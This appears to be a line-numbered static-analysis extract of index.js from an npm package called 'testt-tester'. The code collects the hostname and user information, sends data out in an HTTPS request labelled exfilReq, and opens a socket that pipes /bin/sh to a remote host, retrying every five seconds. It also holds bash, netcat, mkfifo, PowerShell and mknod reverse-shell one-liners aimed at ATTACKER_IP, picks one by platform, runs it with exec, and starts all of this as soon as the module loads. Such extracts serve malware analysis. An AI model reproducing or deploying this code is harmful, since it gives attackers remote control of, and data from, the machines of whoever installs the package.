// File: tmp/tmpohrwvwxv/testt-tester/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const querystring = require("querystring")
Line 4: const https = require("https")
Line 5: const packageJSON = require("./package.json")
Line 7: _tmp_5 = require('child_process')
Line 8: const net = require('net')
Line 18: os.hostname()
Line 19: os.userInfo()
Line 41: const exfilReq = https.request(exfilOptions, (res) => {
    res.on('data', () => {}); // We don't need to do anything with the response
})
Line 63: const client = new net.Socket()
Line 65: {
        // Once connected, spawn a shell and pipe its I/O to the socket
        const spawn = require('child_process').spawn;
        const shell = spawn('/bin/sh', []); // For Linux/macOS
        // const shell = spawn('cmd.exe', []); // For Windows

        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
    }
Line 67: const spawn = require('child_process').spawn
Line 68: const shell = spawn('/bin/sh', [])
Line 71: client.pipe(shell.stdin)
Line 72: shell.stdout.pipe(client)
Line 73: shell.stderr.pipe(client)
Line 76: {
        // Connection failed, try again after a delay or use fallback method
        setTimeout(reverseShell, 5000);
    }
Line 78: setTimeout(reverseShell, 5000)
Line 83: {
    // Linux/Unix/macOS one-liners
    const linuxShells = [
        `bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'`,
        `nc -e /bin/sh ${ATTACKER_IP} ${ATTACKER_PORT}`,
        `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ATTACKER_IP} ${ATTACKER_PORT} >/tmp/f`
    ];

    // Windows one-liners
    const windowsShells = [
        `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ATTACKER_IP}',${ATTACKER_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
        `mknod backpipe p && nc ${ATTACKER_IP} ${ATTACKER_PORT} 0<backpipe | /bin/bas...
Line 86: _tmp_3.push(<operator>.formatString("bash -c 'bash -i >& /dev/tcp/", ATTACKER_IP, "/", ATTACKER_PORT, " 0>&1'"))
Line 87: _tmp_3.push(<operator>.formatString("nc -e /bin/sh ", ATTACKER_IP, " ", ATTACKER_PORT, ""))
Line 88: _tmp_3.push(<operator>.formatString("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ", ATTACKER_IP, " ", ATTACKER_PORT, " >/tmp/f"))
Line 92: const windowsShells = [
        `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ATTACKER_IP}',${ATTACKER_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
        `mknod backpipe p && nc ${ATTACKER_IP} ${ATTACKER_PORT} 0<backpipe | /bin/bash 1>backpipe`
    ]
Line 93: _tmp_4.push(<operator>.formatString("powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('", ATTACKER_IP, "',", ATTACKER_PORT, ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""))
Line 94: _tmp_4.push(<operator>.formatString("mknod backpipe p && nc ", ATTACKER_IP, " ", ATTACKER_PORT, " 0<backpipe | /bin/bash 1>backpipe"))
Line 98: os.platform()
Line 101: {
        command = linuxShells[0]; // Try the most common bash payload first
    }
Line 102: command = linuxShells[0]
Line 103: {
        command = windowsShells[0]; // Try the PowerShell payload
    }
Line 104: command = windowsShells[0]
Line 107: {
        exec(command, (error, stdout, stderr) => {
            // This will often error because the connection breaks, but that's expected
        });
    }
Line 108: exec(command, (error, stdout, stderr) => {
            // This will often error because the connection breaks, but that's expected
        })
Line 117: reverseShell()
